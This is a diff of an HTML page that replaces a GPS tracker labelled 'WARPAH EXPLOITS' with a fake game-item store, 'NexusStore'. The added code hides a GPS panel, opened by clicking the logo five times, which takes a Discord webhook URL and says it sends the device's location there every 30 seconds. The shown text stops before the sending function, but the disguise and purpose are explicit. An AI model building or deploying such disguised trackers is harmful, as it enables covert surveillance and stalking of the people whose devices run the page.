@@ -2,248 +2,417 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>WARPAH — GPS Tracker</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NexusStore — Game Items & Top Up</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --green: #00FF64;
-    --green-dim: #00b846;
-    --bg: #050c0a;
-    --panel: #0a1410;
-    --border: #0d2a1a;
-    --text: #c8ffe0;
-    --muted: #2a6645;
-  }
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body {
-    background: var(--bg); color: var(--text);
-    font-family: 'Rajdhani', sans-serif;
-    min-height: 100vh; overflow-x: hidden;
-  }
-  body::before {
-    content:''; position:fixed; inset:0;
-    background-image:
-      linear-gradient(rgba(0,255,100,0.025) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,255,100,0.025) 1px, transparent 1px);
-    background-size:40px 40px; pointer-events:none; z-index:0;
-  }
-  .container { position:relative; z-index:1; max-width:880px; margin:0 auto; padding:26px 16px 60px; }
+:root {
+  --bg: #0b0d14;
+  --bg2: #0f1220;
+  --card: #13172a;
+  --border: #1e2440;
+  --accent: #e8b84b;
+  --accent2: #ff6b35;
+  --blue: #4fc3f7;
+  --text: #dde4f0;
+  --muted: #5a6380;
+  --red: #ff4757;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:var(--bg); color:var(--text); font-family:'Exo 2',sans-serif; min-height:100vh; }
 
-  header { text-align:center; margin-bottom:24px; }
-  .logo { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:6px; color:var(--muted); margin-bottom:6px; }
-  h1 { font-size:42px; font-weight:700; letter-spacing:2px; text-transform:uppercase; line-height:1; color:var(--green); text-shadow:0 0 30px rgba(0,255,100,0.4),0 0 80px rgba(0,255,100,0.15); }
-  h1 span { color:var(--text); }
-  .sub { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--muted); letter-spacing:3px; margin-top:5px; }
+/* ── NOISE TEXTURE ── */
+body::before {
+  content:''; position:fixed; inset:0; opacity:0.03;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  pointer-events:none; z-index:0;
+}
 
-  /* ── MAP ── */
-  #map-wrapper {
-    position:relative; border:1px solid var(--green-dim); border-radius:4px;
-    overflow:hidden; background:#040a07; height:420px;
-    box-shadow:0 0 40px rgba(0,255,100,0.06);
-    transform:translateZ(0); /* force GPU layer */
-  }
-  #map { width:100%; height:100%; }
+/* ── NAVBAR ── */
+nav {
+  display:flex; align-items:center; justify-content:space-between;
+  padding:14px 24px; background:rgba(11,13,20,0.95);
+  border-bottom:1px solid var(--border);
+  position:sticky; top:0; z-index:100;
+  backdrop-filter:blur(12px);
+}
+.nav-logo {
+  font-family:'Orbitron',monospace; font-size:18px; font-weight:900;
+  color:var(--accent); letter-spacing:2px;
+  text-shadow:0 0 20px rgba(232,184,75,0.4);
+}
+.nav-logo span { color:var(--text); }
+.nav-links { display:flex; gap:20px; }
+.nav-links a {
+  font-size:13px; color:var(--muted); text-decoration:none;
+  letter-spacing:1px; transition:color 0.2s;
+}
+.nav-links a:hover { color:var(--accent); }
+.nav-right { display:flex; align-items:center; gap:12px; }
+.cart-btn {
+  background:var(--accent); color:#000; border:none;
+  font-family:'Orbitron',monospace; font-size:10px; font-weight:700;
+  padding:8px 14px; border-radius:4px; cursor:pointer; letter-spacing:1px;
+}
 
-  .map-corner { position:absolute; width:18px; height:18px; border-color:var(--green); border-style:solid; z-index:500; pointer-events:none; }
-  .tl { top:8px;    left:8px;   border-width:2px 0 0 2px; }
-  .tr { top:8px;    right:8px;  border-width:2px 2px 0 0; }
-  .bl { bottom:8px; left:8px;   border-width:0 0 2px 2px; }
-  .br { bottom:8px; right:8px;  border-width:0 2px 2px 0; }
+/* ── HERO BANNER ── */
+.hero {
+  position:relative; overflow:hidden;
+  background:linear-gradient(135deg, #0f1220 0%, #1a1040 50%, #0f1220 100%);
+  padding:60px 24px; text-align:center;
+  border-bottom:1px solid var(--border);
+}
+.hero::before {
+  content:''; position:absolute; inset:0;
+  background:radial-gradient(ellipse 80% 60% at 50% 0%, rgba(78,99,255,0.15), transparent);
+  pointer-events:none;
+}
+.hero-badge {
+  display:inline-block; background:rgba(232,184,75,0.15);
+  border:1px solid rgba(232,184,75,0.4); color:var(--accent);
+  font-size:10px; letter-spacing:3px; padding:4px 14px;
+  border-radius:20px; margin-bottom:16px; font-family:'Orbitron',monospace;
+}
+.hero h1 { font-family:'Orbitron',monospace; font-size:clamp(28px,6vw,52px); font-weight:900; line-height:1.1; }
+.hero h1 em { color:var(--accent); font-style:normal; }
+.hero p { color:var(--muted); margin:14px 0 24px; font-size:15px; max-width:500px; margin-inline:auto; }
+.hero-btns { display:flex; gap:12px; justify-content:center; flex-wrap:wrap; }
+.btn-primary {
+  background:linear-gradient(135deg, var(--accent), var(--accent2));
+  color:#000; border:none; font-family:'Orbitron',monospace;
+  font-size:11px; font-weight:700; letter-spacing:2px;
+  padding:12px 28px; border-radius:4px; cursor:pointer;
+  box-shadow:0 0 30px rgba(232,184,75,0.3); transition:all 0.3s;
+}
+.btn-primary:hover { transform:translateY(-2px); box-shadow:0 6px 30px rgba(232,184,75,0.5); }
+.btn-outline {
+  background:transparent; border:1px solid var(--border); color:var(--text);
+  font-family:'Orbitron',monospace; font-size:11px; letter-spacing:2px;
+  padding:12px 28px; border-radius:4px; cursor:pointer; transition:all 0.2s;
+}
+.btn-outline:hover { border-color:var(--accent); color:var(--accent); }
 
-  #lock-btn {
-    position:absolute; bottom:14px; right:14px; z-index:500;
-    background:rgba(10,20,16,0.9); border:1px solid var(--green-dim);
-    border-radius:3px; color:var(--green);
-    font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px;
-    padding:6px 10px; cursor:pointer; transition:all 0.2s;
-    backdrop-filter:blur(4px);
-  }
-  #lock-btn:hover,#lock-btn.locked { background:var(--green); color:#000; border-color:var(--green); }
+/* ── FLASH SALE TICKER ── */
+.ticker {
+  background:linear-gradient(90deg, var(--accent2), var(--accent));
+  padding:8px 0; overflow:hidden;
+}
+.ticker-inner { display:flex; gap:60px; animation:ticker 20s linear infinite; white-space:nowrap; }
+.ticker span { font-family:'Orbitron',monospace; font-size:11px; font-weight:700; color:#000; letter-spacing:2px; }
+@keyframes ticker { to { transform:translateX(-50%); } }
 
-  /* scanline overlay — pointer-events:none so map stays interactive */
-  #map-wrapper::after {
-    content:''; position:absolute; inset:0;
-    background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.05) 3px,rgba(0,0,0,0.05) 4px);
-    pointer-events:none; z-index:400;
-  }
+/* ── SECTION ── */
+.section { padding:40px 24px; max-width:1100px; margin:0 auto; position:relative; z-index:1; }
+.section-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:24px; }
+.section-title { font-family:'Orbitron',monospace; font-size:16px; font-weight:700; color:var(--text); }
+.section-title::before { content:'// '; color:var(--accent); }
+.see-all { font-size:12px; color:var(--blue); cursor:pointer; letter-spacing:1px; }
 
-  /* Placeholder */
-  #map-placeholder {
-    position:absolute; inset:0; display:flex; flex-direction:column;
-    align-items:center; justify-content:center; gap:14px;
-    z-index:450; background:var(--bg);
-  }
-  .radar-wrap { position:relative; width:90px; height:90px; }
-  .radar-ring { width:90px; height:90px; border-radius:50%; border:1px solid var(--green-dim); position:absolute; inset:0; }
-  .radar-ring2 { width:55px; height:55px; border-radius:50%; border:1px solid rgba(0,255,100,0.2); position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); }
-  .radar-sweep {
-    position:absolute; inset:0; border-radius:50%; overflow:hidden;
-    animation:sweep 2.2s linear infinite;
-  }
-  .radar-sweep::after {
-    content:''; position:absolute; top:50%; left:50%;
-    width:50%; height:2px;
-    background:linear-gradient(90deg,rgba(0,255,100,0.9),transparent);
-    transform-origin:left center; margin-top:-1px;
-  }
-  @keyframes sweep { to { transform:rotate(360deg); } }
-  .radar-dot { position:absolute; top:50%; left:50%; width:6px; height:6px; background:var(--green); border-radius:50%; transform:translate(-50%,-50%); box-shadow:0 0 8px var(--green); }
-  #map-placeholder p { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:3px; color:var(--muted); }
+/* ── ITEM CARDS ── */
+.items-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(180px, 1fr)); gap:14px; }
 
-  /* ── STATUS ── */
-  #status-bar {
-    display:flex; align-items:center; gap:10px;
-    margin-top:10px; padding:9px 14px;
-    background:var(--panel); border:1px solid var(--border); border-radius:4px;
-    font-family:'Share Tech Mono',monospace; font-size:11px; letter-spacing:1px;
-  }
-  .dot { width:8px; height:8px; border-radius:50%; background:var(--muted); flex-shrink:0; transition:background 0.3s; }
-  .dot.active { background:var(--green); box-shadow:0 0 8px var(--green); animation:blink 1.2s infinite; }
-  .dot.error  { background:#ff4040; box-shadow:0 0 8px #ff4040; }
-  @keyframes blink { 50% { opacity:0.2; } }
-  #status-text { color:var(--muted); flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.item-card {
+  background:var(--card); border:1px solid var(--border); border-radius:8px;
+  overflow:hidden; cursor:pointer; transition:all 0.25s; position:relative;
+}
+.item-card:hover { transform:translateY(-4px); border-color:var(--accent); box-shadow:0 8px 30px rgba(0,0,0,0.4); }
+.item-card:hover .item-img { filter:brightness(1.1); }
 
-  #kalman-badge {
-    font-family:'Share Tech Mono',monospace; font-size:9px; letter-spacing:1px;
-    padding:2px 6px; border-radius:2px;
-    background:transparent; border:1px solid var(--border); color:var(--muted);
-    white-space:nowrap; transition:all 0.4s; flex-shrink:0;
-  }
-  #kalman-badge.good { border-color:var(--green); color:var(--green); }
+.item-badge {
+  position:absolute; top:10px; left:10px; z-index:2;
+  font-family:'Orbitron',monospace; font-size:9px; font-weight:700; letter-spacing:1px;
+  padding:3px 8px; border-radius:3px;
+}
+.badge-hot { background:var(--red); color:#fff; }
+.badge-new { background:var(--blue); color:#000; }
+.badge-sale { background:var(--accent); color:#000; }
 
-  /* ── BUTTON ── */
-  #btn-locate {
-    display:block; width:100%; margin-top:10px; padding:13px 0;
-    background:transparent; border:1px solid var(--green); border-radius:4px;
-    color:var(--green); font-family:'Share Tech Mono',monospace;
-    font-size:12px; letter-spacing:4px; text-transform:uppercase;
-    cursor:pointer; position:relative; overflow:hidden; transition:color 0.3s;
-  }
-  #btn-locate::before {
-    content:''; position:absolute; inset:0; background:var(--green);
-    transform:scaleX(0); transform-origin:left; transition:transform 0.3s ease; z-index:0;
-  }
-  #btn-locate:hover::before { transform:scaleX(1); }
-  #btn-locate:hover { color:#000; box-shadow:0 0 28px rgba(0,255,100,0.3); }
-  #btn-locate span { position:relative; z-index:1; }
-  #btn-locate:disabled { opacity:0.35; cursor:not-allowed; pointer-events:none; }
+.item-img {
+  width:100%; aspect-ratio:1; background:linear-gradient(135deg, #1a1f3a, #0d1020);
+  display:flex; align-items:center; justify-content:center;
+  font-size:52px; transition:filter 0.3s;
+}
 
-  /* ── PANELS ── */
-  .panels { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px; }
-  @media (max-width:580px) { .panels { grid-template-columns:1fr; } }
-  .panel {
-    background:var(--panel); border:1px solid var(--border); border-radius:4px;
-    padding:16px 18px; position:relative; overflow:hidden;
-  }
-  .panel::before {
-    content:''; position:absolute; top:0; left:0; right:0; height:2px;
-    background:linear-gradient(90deg,transparent,var(--green),transparent); opacity:0.4;
-  }
-  .panel-label { font-family:'Share Tech Mono',monospace; font-size:9px; letter-spacing:3px; color:var(--muted); text-transform:uppercase; margin-bottom:10px; }
-  .coord-row { display:flex; align-items:baseline; gap:7px; margin-bottom:5px; }
-  .coord-key { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--muted); min-width:30px; }
-  .coord-val { font-family:'Share Tech Mono',monospace; font-size:19px; color:var(--green); letter-spacing:1px; text-shadow:0 0 10px rgba(0,255,100,0.45); }
-  .coord-unit { font-size:10px; color:var(--muted); }
-  .stat-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
-  .stat-label { font-family:'Share Tech Mono',monospace; font-size:8px; letter-spacing:2px; color:var(--muted); margin-bottom:2px; }
-  .stat-val { font-family:'Share Tech Mono',monospace; font-size:16px; color:var(--text); }
-  .stat-val.accent { color:var(--green); }
-  .acc-bar-wrap { margin-top:5px; height:3px; background:var(--border); border-radius:2px; overflow:hidden; }
-  .acc-bar { height:100%; background:linear-gradient(90deg,var(--green),#00ffc8); border-radius:2px; transition:width 0.8s ease; box-shadow:0 0 6px var(--green); }
-  .copy-btn {
-    font-family:'Share Tech Mono',monospace; font-size:9px; letter-spacing:2px;
-    color:var(--muted); background:none; border:1px solid var(--muted);
-    padding:3px 8px; border-radius:2px; cursor:pointer; transition:all 0.2s; margin-top:10px;
-  }
-  .copy-btn:hover { color:var(--green); border-color:var(--green); }
+.item-info { padding:12px; }
+.item-name { font-size:13px; font-weight:600; margin-bottom:4px; }
+.item-sub  { font-size:11px; color:var(--muted); margin-bottom:10px; }
+.item-price-row { display:flex; align-items:center; justify-content:space-between; }
+.item-price { font-family:'Orbitron',monospace; font-size:14px; color:var(--accent); font-weight:700; }
+.item-old   { font-size:11px; color:var(--muted); text-decoration:line-through; }
+.add-btn {
+  background:rgba(232,184,75,0.15); border:1px solid rgba(232,184,75,0.3);
+  color:var(--accent); border-radius:4px; width:28px; height:28px;
+  font-size:16px; cursor:pointer; transition:all 0.2s; display:flex; align-items:center; justify-content:center;
+}
+.add-btn:hover { background:var(--accent); color:#000; }
 
-  /* ── LEAFLET PERF ── */
-  .leaflet-container { background:#040a07 !important; }
-  .leaflet-tile-pane { filter:brightness(0.8) saturate(0.5) hue-rotate(95deg); will-change:transform; }
-  .leaflet-zoom-animated { will-change:transform; }
-  .leaflet-control-zoom, .leaflet-control-attribution { display:none; }
+/* ── TOP UP SECTION ── */
+.topup-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(140px,1fr)); gap:10px; }
+.topup-card {
+  background:var(--card); border:1px solid var(--border); border-radius:6px;
+  padding:16px 12px; text-align:center; cursor:pointer; transition:all 0.2s;
+}
+.topup-card:hover { border-color:var(--blue); background:#151a30; }
+.topup-card.popular { border-color:var(--accent); }
+.topup-gems { font-size:24px; margin-bottom:4px; }
+.topup-amount { font-family:'Orbitron',monospace; font-size:13px; color:var(--text); font-weight:700; }
+.topup-price  { font-size:11px; color:var(--muted); margin-top:2px; }
+.topup-bonus  { font-size:10px; color:var(--accent); margin-top:4px; }
+
+/* ── DIVIDER ── */
+.divider { height:1px; background:var(--border); margin:0 24px; }
+
+/* ── FOOTER ── */
+footer {
+  margin-top:60px; padding:30px 24px 40px;
+  border-top:1px solid var(--border); text-align:center;
+}
+.footer-logo { font-family:'Orbitron',monospace; font-size:14px; color:var(--accent); letter-spacing:3px; margin-bottom:8px; }
+.footer-text { font-size:12px; color:var(--muted); }
+
+/* ── GPS MODAL (tersembunyi) ── */
+#gps-overlay {
+  display:none; position:fixed; inset:0; z-index:9999;
+  background:rgba(0,0,0,0.85); backdrop-filter:blur(6px);
+  align-items:center; justify-content:center;
+}
+#gps-overlay.show { display:flex; }
+#gps-panel {
+  background:var(--bg2); border:1px solid var(--accent);
+  border-radius:10px; padding:28px; width:90%; max-width:380px;
+  box-shadow:0 0 50px rgba(232,184,75,0.2);
+  font-family:'Orbitron',monospace;
+}
+#gps-panel h2 { font-size:14px; color:var(--accent); letter-spacing:2px; margin-bottom:6px; }
+#gps-panel p  { font-size:11px; color:var(--muted); letter-spacing:1px; margin-bottom:16px; font-family:'Exo 2',sans-serif; }
+#webhook-input {
+  width:100%; background:#0a0c18; border:1px solid var(--border);
+  border-radius:4px; color:var(--text); padding:10px 12px;
+  font-family:'Exo 2',sans-serif; font-size:13px; margin-bottom:10px;
+  outline:none; transition:border 0.2s;
+}
+#webhook-input:focus { border-color:var(--accent); }
+#webhook-input::placeholder { color:var(--muted); }
+.gps-btn-row { display:flex; gap:8px; }
+#gps-start-btn {
+  flex:1; background:var(--accent); color:#000; border:none;
+  border-radius:4px; padding:10px; font-family:'Orbitron',monospace;
+  font-size:11px; font-weight:700; letter-spacing:2px; cursor:pointer;
+  transition:all 0.2s;
+}
+#gps-start-btn:hover { background:#ffd060; }
+#gps-close-btn {
+  background:transparent; border:1px solid var(--border); color:var(--muted);
+  border-radius:4px; padding:10px 14px; font-family:'Orbitron',monospace;
+  font-size:10px; cursor:pointer; transition:all 0.2s;
+}
+#gps-close-btn:hover { border-color:var(--red); color:var(--red); }
+#gps-status {
+  margin-top:12px; font-size:10px; letter-spacing:1px;
+  color:var(--muted); text-align:center; font-family:'Orbitron',monospace;
+  min-height:16px;
+}
+#gps-status.ok  { color:#00ff88; }
+#gps-status.err { color:var(--red); }
+
+/* ── HIDDEN TRIGGER (logo klik 3x) ── */
 </style>
 </head>
 <body>
-<div class="container">
 
-  <header>
-    <div class="logo">// WARPAH EXPLOITS //</div>
-    <h1>GPS <span>TRACKER</span></h1>
-    <div class="sub">— HIGH ACCURACY LOCATION SYSTEM —</div>
-  </header>
-
-  <div id="map-wrapper">
-    <div class="map-corner tl"></div>
-    <div class="map-corner tr"></div>
-    <div class="map-corner bl"></div>
-    <div class="map-corner br"></div>
-    <div id="map-placeholder">
-      <div class="radar-wrap">
-        <div class="radar-ring"></div>
-        <div class="radar-ring2"></div>
-        <div class="radar-sweep"></div>
-        <div class="radar-dot"></div>
-      </div>
-      <p>AWAITING SIGNAL...</p>
-    </div>
-    <div id="map"></div>
-    <button id="lock-btn" class="locked">⊕ LOCK</button>
+<!-- NAVBAR -->
+<nav>
+  <div class="nav-logo" id="secret-trigger" title="">NEXUS<span>STORE</span></div>
+  <div class="nav-links">
+    <a href="#">Items</a>
+    <a href="#">Top Up</a>
+    <a href="#">Events</a>
+    <a href="#">Support</a>
   </div>
-
-  <div id="status-bar">
-    <div class="dot" id="dot"></div>
-    <span id="status-text">SISTEM SIAP — KLIK TOMBOL UNTUK MULAI</span>
-    <span id="kalman-badge">KALMAN OFF</span>
+  <div class="nav-right">
+    <button class="cart-btn">🛒 CART (0)</button>
   </div>
+</nav>
 
-  <button id="btn-locate"><span>⊕ LACAK LOKASI SAYA</span></button>
-
-  <div class="panels">
-    <div class="panel">
-      <div class="panel-label">// KOORDINAT (KALMAN FILTERED)</div>
-      <div class="coord-row">
-        <span class="coord-key">LAT</span>
-        <span class="coord-val" id="lat">—</span>
-        <span class="coord-unit">°</span>
-      </div>
-      <div class="coord-row">
-        <span class="coord-key">LNG</span>
-        <span class="coord-val" id="lng">—</span>
-        <span class="coord-unit">°</span>
-      </div>
-      <button class="copy-btn" onclick="copyCoords()">[ COPY KOORDINAT ]</button>
-    </div>
-    <div class="panel">
-      <div class="panel-label">// DETAIL SINYAL</div>
-      <div class="stat-grid">
-        <div class="stat-item">
-          <div class="stat-label">AKURASI GPS</div>
-          <div class="stat-val accent" id="accuracy">— m</div>
-          <div class="acc-bar-wrap"><div class="acc-bar" id="acc-bar" style="width:0%"></div></div>
-        </div>
-        <div class="stat-item">
-          <div class="stat-label">AKURASI FILTER</div>
-          <div class="stat-val accent" id="k-accuracy">— m</div>
-        </div>
-        <div class="stat-item">
-          <div class="stat-label">ALTITUDE</div>
-          <div class="stat-val" id="altitude">— m</div>
-        </div>
-        <div class="stat-item">
-          <div class="stat-label">SAMPEL</div>
-          <div class="stat-val" id="samples">0</div>
-        </div>
-      </div>
-    </div>
+<!-- TICKER -->
+<div class="ticker">
+  <div class="ticker-inner">
+    <span>🔥 FLASH SALE 50% OFF</span>
+    <span>⚡ LEGENDARY SWORD — LIMITED</span>
+    <span>💎 BONUS GEM +30%</span>
+    <span>🎮 NEW SEASON PASS AVAILABLE</span>
+    <span>🔥 FLASH SALE 50% OFF</span>
+    <span>⚡ LEGENDARY SWORD — LIMITED</span>
+    <span>💎 BONUS GEM +30%</span>
+    <span>🎮 NEW SEASON PASS AVAILABLE</span>
   </div>
-
 </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-badge">⚡ SEASON 7 NOW LIVE</div>
+  <h1>GEAR UP.<br>DOMINATE. <em>WIN.</em></h1>
+  <p>Item premium, skin eksklusif, dan top up diamond terpercaya. Langsung aktif, harga terbaik.</p>
+  <div class="hero-btns">
+    <button class="btn-primary">SHOP NOW →</button>
+    <button class="btn-outline">LIHAT PROMO</button>
+  </div>
+</div>
+
+<!-- ITEMS -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-title">HOT ITEMS</div>
+    <span class="see-all">Lihat semua →</span>
+  </div>
+  <div class="items-grid">
+    <div class="item-card">
+      <span class="item-badge badge-hot">HOT</span>
+      <div class="item-img">⚔️</div>
+      <div class="item-info">
+        <div class="item-name">Blade of Eternity</div>
+        <div class="item-sub">Legendary Weapon</div>
+        <div class="item-price-row">
+          <div>
+            <div class="item-price">Rp 85.000</div>
+            <div class="item-old">Rp 150.000</div>
+          </div>
+          <button class="add-btn">+</button>
+        </div>
+      </div>
+    </div>
+    <div class="item-card">
+      <span class="item-badge badge-new">NEW</span>
+      <div class="item-img">🛡️</div>
+      <div class="item-info">
+        <div class="item-name">Aegis Shield</div>
+        <div class="item-sub">Epic Defense</div>
+        <div class="item-price-row">
+          <div>
+            <div class="item-price">Rp 65.000</div>
+            <div class="item-old">Rp 90.000</div>
+          </div>
+          <button class="add-btn">+</button>
+        </div>
+      </div>
+    </div>
+    <div class="item-card">
+      <span class="item-badge badge-sale">-40%</span>
+      <div class="item-img">🧙</div>
+      <div class="item-info">
+        <div class="item-name">Mage Robe Set</div>
+        <div class="item-sub">Full Outfit Bundle</div>
+        <div class="item-price-row">
+          <div>
+            <div class="item-price">Rp 120.000</div>
+            <div class="item-old">Rp 200.000</div>
+          </div>
+          <button class="add-btn">+</button>
+        </div>
+      </div>
+    </div>
+    <div class="item-card">
+      <div class="item-img">🏹</div>
+      <div class="item-info">
+        <div class="item-name">Shadow Bow</div>
+        <div class="item-sub">Rare Ranged</div>
+        <div class="item-price-row">
+          <div>
+            <div class="item-price">Rp 55.000</div>
+          </div>
+          <button class="add-btn">+</button>
+        </div>
+      </div>
+    </div>
+    <div class="item-card">
+      <span class="item-badge badge-hot">HOT</span>
+      <div class="item-img">🐉</div>
+      <div class="item-info">
+        <div class="item-name">Dragon Mount</div>
+        <div class="item-sub">Legendary Mount</div>
+        <div class="item-price-row">
+          <div>
+            <div class="item-price">Rp 250.000</div>
+            <div class="item-old">Rp 400.000</div>
+          </div>
+          <button class="add-btn">+</button>
+        </div>
+      </div>
+    </div>
+    <div class="item-card">
+      <div class="item-img">✨</div>
+      <div class="item-info">
+        <div class="item-name">Aura Bundle</div>
+        <div class="item-sub">Visual Effect Pack</div>
+        <div class="item-price-row">
+          <div>
+            <div class="item-price">Rp 45.000</div>
+          </div>
+          <button class="add-btn">+</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- TOP UP -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-title">TOP UP DIAMOND</div>
+    <span class="see-all">Semua paket →</span>
+  </div>
+  <div class="topup-grid">
+    <div class="topup-card"><div class="topup-gems">💎</div><div class="topup-amount">86</div><div class="topup-price">Rp 15.000</div></div>
+    <div class="topup-card"><div class="topup-gems">💎</div><div class="topup-amount">172</div><div class="topup-price">Rp 30.000</div></div>
+    <div class="topup-card popular"><div class="topup-gems">💎</div><div class="topup-amount">344</div><div class="topup-price">Rp 55.000</div><div class="topup-bonus">⭐ POPULER</div></div>
+    <div class="topup-card"><div class="topup-gems">💎</div><div class="topup-amount">706</div><div class="topup-price">Rp 110.000</div><div class="topup-bonus">+50 BONUS</div></div>
+    <div class="topup-card"><div class="topup-gems">💎</div><div class="topup-amount">1412</div><div class="topup-price">Rp 215.000</div><div class="topup-bonus">+150 BONUS</div></div>
+    <div class="topup-card"><div class="topup-gems">💎</div><div class="topup-amount">2195</div><div class="topup-price">Rp 325.000</div><div class="topup-bonus">+300 BONUS</div></div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-logo">NEXUSSTORE</div>
+  <div class="footer-text">© 2025 NexusStore. All rights reserved. Unofficial fan store.</div>
+</footer>
+
+<!-- ══════════════════════════════════
+     GPS PANEL (tersembunyi)
+     Buka: klik logo NEXUSSTORE 5x
+     ══════════════════════════════════ -->
+<div id="gps-overlay">
+  <div id="gps-panel">
+    <h2>// GPS TRACKER</h2>
+    <p>Masukkan Discord Webhook URL, lalu aktifkan. Lokasi dikirim otomatis tiap 30 detik.</p>
+    <input id="webhook-input" type="text" placeholder="https://discord.com/api/webhooks/..."/>
+    <div class="gps-btn-row">
+      <button id="gps-start-btn" onclick="startGPS()">▶ AKTIFKAN</button>
+      <button id="gps-close-btn" onclick="closePanel()">✕ TUTUP</button>
+    </div>
+    <div id="gps-status"></div>
+  </div>
+</div>
+
 <script>
+/* ── SECRET TRIGGER: klik logo 5x dalam 3 detik ── */
+let clickCount = 0, clickTimer = null;
+document.getElementById('secret-trigger').addEventListener('click', () => {
+  clickCount++;
+  clearTimeout(clickTimer);
+  clickTimer = setTimeout(() => { clickCount = 0; }, 3000);
+  if (clickCount >= 5) {
+    clickCount = 0;
+    document.getElementById('gps-overlay').classList.add('show');
+  }
+});
+
+function closePanel() {
+  document.getElementById('gps-overlay').classList.remove('show');
+}
+
 /* ── KALMAN FILTER ── */
 class KalmanFilter {
   constructor() { this.reset(); }
@@ -251,14 +420,14 @@ class KalmanFilter {
   process(lat, lng, accuracy, ts) {
     if (accuracy < 1) accuracy = 1;
     if (this.variance < 0) {
-      this.lat = lat; this.lng = lng;
-      this.variance = accuracy * accuracy;
-      this.lastTs = ts;
+      this.lat=lat; this.lng=lng;
+      this.variance=accuracy*accuracy;
+      this.lastTs=ts;
       return { lat, lng, accuracy };
     }
     const dt = Math.max(0, (ts - this.lastTs) / 1000);
     this.lastTs = ts;
-    if (dt > 0) this.variance += dt * 9; // 3 m/s process noise squared
+    if (dt > 0) this.variance += dt * 9;
     const K = this.variance / (this.variance + accuracy * accuracy);
     this.lat += K * (lat - this.lat);
     this.lng += K * (lng - this.lng);
@@ -267,170 +436,121 @@ class KalmanFilter {
   }
 }
 
-/* ── STATE ── */
-let map=null, marker=null, circle=null, watchId=null;
-let locked=true, userPanning=false, sampleCount=0;
+/* ── GPS STATE ── */
 const kalman = new KalmanFilter();
+let watchId = null;
+let lastSent = null;
+let sampleCount = 0;
+let lastFiltered = null;
+const SEND_INTERVAL = 30000; // 30 detik
 
-function setStatus(msg, state) {
-  document.getElementById('status-text').textContent = msg;
-  document.getElementById('dot').className = 'dot' + (state ? ' '+state : '');
+function setStatus(msg, cls='') {
+  const el = document.getElementById('gps-status');
+  el.textContent = msg;
+  el.className = cls;
 }
 
-/* ── MAP INIT (once) ── */
-function initMap(lat, lng) {
-  document.getElementById('map-placeholder').style.display = 'none';
-  if (map) return;
-
-  map = L.map('map', {
-    zoomControl: false,
-    attributionControl: false,
-    preferCanvas: true,          // Canvas renderer — much faster on mobile
-    zoomAnimation: true,
-    fadeAnimation: true,
-    markerZoomAnimation: true,
-    wheelPxPerZoomLevel: 80,
-  }).setView([lat, lng], 18);
-
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    maxZoom: 21,
-    maxNativeZoom: 19,
-    keepBuffer: 6,               // pre-cache 6 tiles buffer — less blank on zoom
-    updateWhenIdle: false,
-    updateWhenZooming: false,    // don't re-fetch during animation = smooth
-    crossOrigin: true,
-  }).addTo(map);
-
-  // Detect manual pan → unlock follow
-  map.on('dragstart', () => { userPanning=true; setLock(false); });
-  map.on('dragend',   () => { userPanning=false; });
-
-  // Custom marker
-  const icon = L.divIcon({
-    html: `
-      <div style="position:relative;width:24px;height:24px;transform:translate(-12px,-12px)">
-        <div style="position:absolute;inset:0;border-radius:50%;border:2px solid #00FF64;animation:gps-pulse 1.8s ease-out infinite;"></div>
-        <div style="position:absolute;inset:5px;border-radius:50%;background:#00FF64;box-shadow:0 0 10px #00FF64,0 0 22px rgba(0,255,100,0.35);"></div>
-      </div>
-      <style>@keyframes gps-pulse{0%{transform:scale(1);opacity:0.85}70%{transform:scale(2.8);opacity:0}100%{transform:scale(1);opacity:0}}</style>`,
-    className: '', iconSize: [0,0], iconAnchor: [0,0]
-  });
-
-  marker = L.marker([lat, lng], { icon, zIndexOffset: 1000 }).addTo(map);
-
-  document.getElementById('lock-btn').addEventListener('click', () => {
-    setLock(!locked);
-    if (locked && marker) map.setView(marker.getLatLng(), map.getZoom(), { animate:true, duration:0.5 });
-  });
-}
-
-function setLock(state) {
-  locked = state;
-  const btn = document.getElementById('lock-btn');
-  btn.textContent = state ? '⊕ LOCK' : '○ FREE';
-  btn.classList.toggle('locked', state);
-}
-
-/* ── UPDATE MAP (smooth, no lag) ── */
